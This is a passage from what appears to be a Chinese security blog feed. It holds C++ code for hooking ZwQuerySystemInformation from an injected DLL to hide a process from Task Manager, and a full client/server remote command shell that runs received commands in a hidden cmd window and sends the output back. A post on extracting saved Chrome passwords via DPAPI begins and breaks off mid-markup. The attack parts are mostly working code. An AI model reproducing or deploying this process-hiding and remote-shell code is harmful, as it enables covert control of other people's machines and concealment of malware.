HMODULE hntdll = <span class="hljs-built_in">LoadLibraryA</span>(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!hntdll) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] Load ntdll Faild..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> status;<br>    &#125;<br>    <span class="hljs-comment">// 获取 ZwQuerySystemInformation 函数地址</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _WIN64</span><br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">DWORD</span><span class="hljs-params">(WINAPI* typedef_ZwQuerySystemInformation)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span><br><span class="hljs-params"><span class="hljs-function">        _Inout_   PVOID                    SystemInformation,</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_      ULONG                    SystemInformationLength,</span></span><br><span class="hljs-params"><span class="hljs-function">        _Out_opt_ PULONG                   ReturnLength</span></span><br><span class="hljs-params"><span class="hljs-function">        )</span></span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">DWORD</span><span class="hljs-params">(WINAPI* typedef_ZwQuerySystemInformation)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span><br><span class="hljs-params"><span class="hljs-function">        _Inout_   PVOID                    SystemInformation,</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_      ULONG                    SystemInformationLength,</span></span><br><span class="hljs-params"><span class="hljs-function">        _Out_opt_ PULONG                   ReturnLength</span></span><br><span class="hljs-params"><span class="hljs-function">        )</span></span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    typedef_ZwQuerySystemInformation ZwQuerySystemInformation = (typedef_ZwQuerySystemInformation)::<span class="hljs-built_in">GetProcAddress</span>(hntdll, <span class="hljs-string">&quot;ZwQuerySystemInformation&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!ZwQuerySystemInformation) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] Get ZwQuerySystemInformation Addr Faild..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> status;<br>    &#125;<br>    <span class="hljs-comment">//调用原来的函数,第二个参数是返回请求的信息</span><br>    status = <span class="hljs-built_in">ZwQuerySystemInformation</span>(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">NT_SUCCESS</span>(status) &amp;&amp; <span class="hljs-number">5</span> == SystemInformationClass)<br>    &#123;<br>        pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;<br>        <span class="hljs-keyword">while</span> (TRUE)<br>        &#123;<br>            <span class="hljs-comment">// 判断是否是要隐藏的进程PID,是就把该进程信息删除</span><br>            <span class="hljs-keyword">if</span> (dwHideProcessId == (DWORD)pCur-&gt;UniqueProcessId)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> == pCur-&gt;NextEntryOffset)<br>                &#123;<br>                    pPrev-&gt;NextEntryOffset = <span class="hljs-number">0</span>;<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    pPrev-&gt;NextEntryOffset = pPrev-&gt;NextEntryOffset + pCur-&gt;NextEntryOffset;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                pPrev = pCur;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> == pCur-&gt;NextEntryOffset)<br>            &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            pCur = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)pCur + pCur-&gt;NextEntryOffset);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//挂钩</span><br>    <span class="hljs-built_in">hookZwQuerySystemInformation</span>();<br>    <span class="hljs-keyword">return</span> status;<br>&#125;<br></code></pre></td></tr></table></figure><p>以上函数全部写在dll中,<code>dllmain</code>主函数:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">( HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">                       DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">                       LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">                     )</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        <span class="hljs-built_in">hookZwQuerySystemInformation</span>();<br>        g_hModule = hModule;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-built_in">unhookZwQuerySystemInformation</span>();<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><ul><li>win10</li><li>64位dll</li><li>Injectdll(进程注入程序)</li><li>Taskmgr.exe</li></ul><p>要注意的是dll的位数。<br>找到任务管理器pid:<br><img src="/img/HOOKZwQuerySystemInformation/5.png"></p><p>这里选择隐藏QQ程序<br><img src="/img/HOOKZwQuerySystemInformation/6.png"></p><p>注入程序后<br><img src="/img/HOOKZwQuerySystemInformation/7.png"></p><p><img src="/img/HOOKZwQuerySystemInformation/8.png"></p><p>可以看到QQ进程信息已经剔除</p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>如何将所有进程钩住?<br>使用全局钩子,这里我认为是两个知识点,就不继续展开说了。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>socket之shell实现</title>
    <link href="/2021/06/21/RemoteCmd/"/>
    <url>/2021/06/21/RemoteCmd/</url>
    
    <content type="html"><![CDATA[<h2 id="Socket"><a href="#Socket" class="headerlink" title="Socket"></a>Socket</h2><p>Socket中文为”套接字”,实际上是windows的API,程序员无需知道<code>TCP/IP</code>的细节可直接调用网络编程接口,Socket中有两种通信协议可供选择</p><ul><li>TCP</li><li>UDP<br>TCP是安全的,在传输数据前必须建立连接,这个连接实际上是三次握手;UDP则是不安全的,但是他的效率是比TCP要高的,QQ实际上就是使用UDP协议<br>思路是非常简单的</li></ul><ol><li>Socket建立通信</li><li>客户端执行命令并返回结果</li></ol><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><p>服务端(监听端):<br>服务器端初始化<code>Winsock</code>环境后，便调用Socket丽数创建流式套接字;然后对<code>sockadd_in</code>结构体进行设置，设置服务器绑定的IP地址和端口等信息并调用<code>bind</code>函数来绑定;绑定成功后，就可以调用<code>listen</code>函数设置连接数量，并进行监听。直到有来自客户端的连接请求，服务器便调用<code>accept</code>函数接受连接请求，建立连接。这时，可以使用<code>recv</code>函数和<code>send</code>函数与客户端进行数据收发</p><p>客户端(接收端):<br>客户端初始化环境后,便调用Socket函数创建流式套接字;然后对<code>sockaddr_in</code>结构体进行设置，设置服务器的IP地址和端口等信息并调用<code>connect</code>函数向服务器发送连接请求，并等待服务器响应。服务器接受连接请求后，就成功地与服务器建立连接，这时，可以使用<code>recv</code>函数和<code>send</code>函数与客户端进行数据收发。</p><p>为了方便理解画一个图<br><img src="/img/socket/1.png"></p><h2 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h2><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>创建一个函数,实现服务端的winsock初始化,创建流式socket,绑定服务端地址和端口和监听</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">SocketListen</span><span class="hljs-params">(LPSTR ipaddr,<span class="hljs-keyword">int</span> port)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//初始化winsock环境</span><br>    WSADATA wsadata = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">WSAStartup</span>(<span class="hljs-built_in">MAKEWORD</span>(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>), &amp;wsadata) == SOCKET_ERROR) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] Failed to initialize Winsock character environment..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-comment">//创建流式socket</span><br>    g_SeverSocket = <span class="hljs-built_in">socket</span>(AF_INET,SOCK_STREAM,<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (g_SeverSocket == INVALID_SOCKET)<br>    &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] Socket Failed..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-comment">//设置服务端地址和端口</span><br>    sockaddr_in ServerAddr;<br>    ServerAddr.sin_family = AF_INET;<br>    ServerAddr.sin_port = ::<span class="hljs-built_in">htons</span>(port);<br>    ServerAddr.sin_addr.S_un.S_addr = ::<span class="hljs-built_in">inet_addr</span>(ipaddr);<br>    <span class="hljs-comment">//绑定端口ip</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> != ::<span class="hljs-built_in">bind</span>(g_SeverSocket, (LPSOCKADDR)&amp;ServerAddr, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(ServerAddr))) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] bind Failed..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-comment">//设置监听,参数:已捆绑未连接的套接字描述字，正在等待连接的最大队列长度</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> != ::<span class="hljs-built_in">listen</span>(g_SeverSocket, <span class="hljs-number">1</span>)) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] listen Failed..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>再等待客户端的连接,如果<code>accept</code>到一个客户端,就让用户在命令行输入命令,并将命令发送给客户端。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">VOID <span class="hljs-title">AcceptRecvMsg</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    sockaddr_in addr = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-keyword">int</span> len = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(addr);<br>    <span class="hljs-comment">//接收客户端请求</span><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;[+] Wait a Client connect..\n&quot;</span>;<br>    g_ClientSocket = ::<span class="hljs-built_in">accept</span>(g_SeverSocket, (LPSOCKADDR)&amp;addr, &amp;len);<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;[+] a Client connect..\n&quot;</span>;<br>    <span class="hljs-keyword">char</span> szBuffer[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-keyword">while</span> (TRUE)<br>    &#123;<br>        <span class="hljs-comment">//接收用户输入并发送给客户端</span><br>        <span class="hljs-built_in">SendCommand</span>();<br>        <span class="hljs-comment">//接收数据</span><br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)<br>        &#123;<br>            <span class="hljs-keyword">int</span> rRet = ::<span class="hljs-built_in">recv</span>(g_ClientSocket, szBuffer, MAX_PATH, <span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">if</span> (rRet &lt;= <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            std::cout &lt;&lt; <span class="hljs-string">&quot;[+] recv:\n&quot;</span> &lt;&lt; szBuffer &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <br>    &#125;<br>&#125;<br><br><span class="hljs-function">VOID <span class="hljs-title">SendCommand</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> cmd[<span class="hljs-number">20</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot; &gt;&quot;</span>;<br>    cin.<span class="hljs-built_in">getline</span>(cmd, <span class="hljs-number">20</span>);<br>    ::<span class="hljs-built_in">send</span>(g_ClientSocket, cmd, <span class="hljs-number">1</span> + <span class="hljs-built_in">strlen</span>(cmd), <span class="hljs-literal">NULL</span>);<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;[+] sent:&quot;</span> &lt;&lt; cmd &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>客户端只需要在初始化环境后与服务端<code>connect</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">connection</span><span class="hljs-params">(LPSTR ServerIP,<span class="hljs-keyword">int</span> ServerPort)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//初始化winsock环境</span><br>    WSADATA wsadata = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">WSAStartup</span>(<span class="hljs-built_in">MAKEWORD</span>(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>), &amp;wsadata) == SOCKET_ERROR) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] Failed to initialize Winsock character environment..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-comment">//创建流式socket</span><br>    g_ClientSocket = <span class="hljs-built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (g_ClientSocket == INVALID_SOCKET)<br>    &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] Socket Failed..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-comment">//设置服务端地址和端口</span><br>    sockaddr_in ServerAddr;<br>    ServerAddr.sin_family = AF_INET;<br>    ServerAddr.sin_port = ::<span class="hljs-built_in">htons</span>(ServerPort);<br>    ServerAddr.sin_addr.S_un.S_addr = ::<span class="hljs-built_in">inet_addr</span>(ServerIP);<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;[+] connect ...\n&quot;</span>;<br>    <span class="hljs-comment">//建立连接</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> != ::<span class="hljs-built_in">connect</span>(g_ClientSocket, (LPSOCKADDR)&amp;ServerAddr, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(ServerAddr))) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] connect Failed..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>连接后就是负责接收服务端传输的数据,也就是dos命令,并执行,将执行后的结果返回服务端(这里先返回一个ok)。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">VOID <span class="hljs-title">SendRet</span><span class="hljs-params">(LPSTR pszSend)</span></span><br><span class="hljs-function"></span>&#123;<br>    ::<span class="hljs-built_in">send</span>(g_ClientSocket, pszSend, <span class="hljs-number">1</span> + <span class="hljs-built_in">strlen</span>(pszSend), <span class="hljs-literal">NULL</span>);<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;[+] sent Bytes:&quot;</span> &lt;&lt; pszSend &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><span class="hljs-function">VOID <span class="hljs-title">RecvCommand</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> szBuffer[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-comment">//char szRetBuffer[11240] = &#123; 0 &#125;;</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)<br>    &#123;<br>        <span class="hljs-comment">//接收数据</span><br>        <span class="hljs-keyword">int</span> ret = ::<span class="hljs-built_in">recv</span>(g_ClientSocket, szBuffer, MAX_PATH, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (ret &lt;= <span class="hljs-literal">NULL</span>)<br>        &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-comment">//执行命令</span><br>        <span class="hljs-built_in">system</span>(szBuffer);<br>        <span class="hljs-built_in">SendRet</span>((LPSTR)<span class="hljs-string">&quot;ok&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里已经实现了可以循环执行命令,那么现在就是要把控制台输出数据传输回来。<br><img src="/img/socket/2.png"></p><p>这里把<code>system</code>函数替换掉,利用<code>CreatePipe</code>匿名管道一边读,一边写,再通过<code>CreateProcess</code>创建cmd进程执行命令,将返回的数据读进管道,再读出到缓存区,返回到服务端</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CreatePipe</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  PHANDLE               hReadPipe,</span></span><br><span class="hljs-params"><span class="hljs-function">  PHANDLE               hWritePipe,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPSECURITY_ATTRIBUTES lpPipeAttributes,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD                 nSize</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CreateProcessA</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCSTR                lpApplicationName,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPSTR                 lpCommandLine,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span><br><span class="hljs-params"><span class="hljs-function">  BOOL                  bInheritHandles,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD                 dwCreationFlags,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPVOID                lpEnvironment,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCSTR                lpCurrentDirectory,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPSTARTUPINFOA        lpStartupInfo,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPPROCESS_INFORMATION lpProcessInformation</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p>代码实现</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">GetCmdData</span><span class="hljs-params">(LPSTR lpscmd, LPSTR lpsRetBuffer,DWORD RetBufferSize)</span></span><br><span class="hljs-function"></span>&#123;<br>    SECURITY_ATTRIBUTES sa;<br>    HANDLE hRead, hWrite;<br>    sa.bInheritHandle = TRUE;<br>    sa.nLength = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(sa);<br>    sa.lpSecurityDescriptor = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-comment">//创建匿名管道</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">CreatePipe</span>(&amp;hRead, &amp;hWrite, &amp;sa, <span class="hljs-number">0</span>)) &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;CreatePipe Failed..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-comment">//设置新进程参数</span><br>    STARTUPINFOA si = &#123;<span class="hljs-number">0</span>&#125;;<br>    PROCESS_INFORMATION pi = &#123;<span class="hljs-number">0</span>&#125;;<br>    si.cb = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(si);<br>    si.hStdError = hWrite;<br>    si.hStdOutput = hWrite;<br>    si.wShowWindow = SW_HIDE;<br>    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;<br>    <span class="hljs-comment">//创建进程执行命令</span><br>    <span class="hljs-keyword">if</span> (!::<span class="hljs-built_in">CreateProcessA</span>(<span class="hljs-literal">NULL</span>, lpscmd, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, TRUE, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si, &amp;pi))&#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;CreateProcess Failed..\n&quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>();<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-built_in">CloseHandle</span>(hWrite);<br>    <span class="hljs-comment">//等待命令执行结束</span><br>    ::<span class="hljs-built_in">WaitForSingleObject</span>(pi.hThread, INFINITE);<br>    ::<span class="hljs-built_in">WaitForSingleObject</span>(pi.hProcess, INFINITE);<br>    <span class="hljs-comment">//读取管道中的数据,即执行命令后的结果</span><br>    ::<span class="hljs-built_in">RtlZeroMemory</span>(lpsRetBuffer, RetBufferSize);<br>    <span class="hljs-keyword">if</span> (!::<span class="hljs-built_in">ReadFile</span>(hRead, lpsRetBuffer, <span class="hljs-number">10000</span>, &amp;RetBufferSize, <span class="hljs-literal">NULL</span>)) &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;ReadFile Failed..\n&quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>();<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-built_in">CloseHandle</span>(hRead);<br>    <span class="hljs-built_in">CloseHandle</span>(pi.hProcess);<br>    <span class="hljs-built_in">CloseHandle</span>(pi.hThread);<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/socket/3.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>抓取Chrome所有版本密码</title>
    <link href="/2021/06/20/CatchChrome/"/>
    <url>/2021/06/20/CatchChrome/</url>
    
    <content type="html"><![CDATA[<p>工具已上传到github:<a href="https://github.com/SD-XD/Catch-Browser">https://github.com/SD-XD/Catch-Browser</a></p><h2 id="谷歌浏览器存储密码的方式"><a href="#谷歌浏览器存储密码的方式" class="headerlink" title="谷歌浏览器存储密码的方式"></a>谷歌浏览器存储密码的方式</h2><p>在使用谷歌浏览器时,如果我们输入某个网站的账号密码,他会自动问我们是否要保存密码,以便下次登录的时候自动填写账号和密码<br><img src="/img/CatchChrome/1.png"></p><p>在设置中可以找到登录账户和密码</p><p><img src="/img/CatchChrome/2.png"></p><p>也可以直接看密码,不过需要凭证</p><p><img src="/img/CatchChrome/3.png"></p><p>这其实是windows的DPAPI机制</p><h2 id="DPAPI"><a href="#DPAPI" class="headerlink" title="DPAPI"></a>DPAPI</h2><p>Data Protection Application Programming Interface(数据保护API)</p><p>DPAPI是Windows系统级对数据进行加解密的一种接口无需自实现加解密代码微软已经提供了经过验证的高质量加解密算法提供了用户态的接口对密钥的推导存储数据加解密实现透明并提供较高的安全保证</p><p>DPAPI提供了两个用户态接口<code>CryptProtectData</code>加密数据<code>CryptUnprotectData</code>解密数据加密后的数据由应用程序负责安全存储应用无需解析加密后的数据格式。但是加密后的数据存储需要一定的机制因为该数据可以被其他任何进程用来解密当然<code>CryptProtectData</code>也提供了用户输入额外数据来参与对用户数据进行加密的参数但依然无法放于暴力破解。</p><p>微软提供了两个接口用来加密和解密,<code>CryptProtectMemory</code>和<code>CryptUnprotectMemory</code></p><p>实际上,在老版本(80之前)的谷歌浏览器,仅仅是使用了<code>CryptProtectMemory</code>来对密码进行加密</p><h2 id="80版本之前的Chrome"><a href="#80版本之前的Chrome" class="headerlink" title="80版本之前的Chrome"></a>80版本之前的Chrome</h2><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><ul><li>win7</li><li>Chrome版本 79.0.3945.117</li></ul><h3 id="实验过程"><a href="#实验过程" 